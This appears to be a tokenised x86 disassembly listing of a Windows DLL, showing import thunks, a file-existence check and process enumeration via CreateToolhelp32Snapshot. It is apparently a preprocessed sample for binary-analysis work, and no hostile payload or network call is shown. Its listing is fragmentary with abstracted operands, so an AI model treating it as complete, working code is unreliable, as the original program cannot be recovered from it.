??2@YAPAXI@Z
jmp [ operator new@IAT ]
free
jmp [ free@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
strcat
jmp [ strcat@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_10003f90
mov eax [ esp + 0x4 ]
push eax
call [ GetFileAttributesA@IAT ]
xor ecx ecx
cmp eax 0xffffffff
setne cl
mov eax ecx
retn
sub_100041c0
push 0x0
push 0x2
call CreateToolhelp32Snapshot
retn
sub_100042c0
mov eax [ esp + 0x4 ]
push eax
call sub_100041d0
add esp 0x4
retn
sub_10004320
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x400 ]
cmp eax 0x186a0
jb r-xdata
xor eax eax
retn 0x4
cmp [ eax ] 0x0
je r-xdata
push ecx
call eax
sub_10004da0
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
push 0xf
push edx
call sub_10004c90
add esp 0x10
retn
sub_10006190
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
push eax
push ecx
call calloc
add esp 0x8
retn
sub_100061b0
mov eax [ esp + 0x8 ]
push eax
call free
pop ecx
retn
sub_100069b0
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
mov ecx [ eax + 0x28 ]
push ecx
call [ eax + 0x24 ]
add esp 0x8
retn
sub_100070d0
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax ] ecx
mov eax [ rw-data ]
mov ecx [ esp + 0xc ]
mov [ edx ] eax
mov edx [ esp + 0x10 ]
xor eax eax
mov [ ecx ] rw-data
mov [ edx ] rw-data
retn
calloc
jmp [ calloc@IAT ]
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
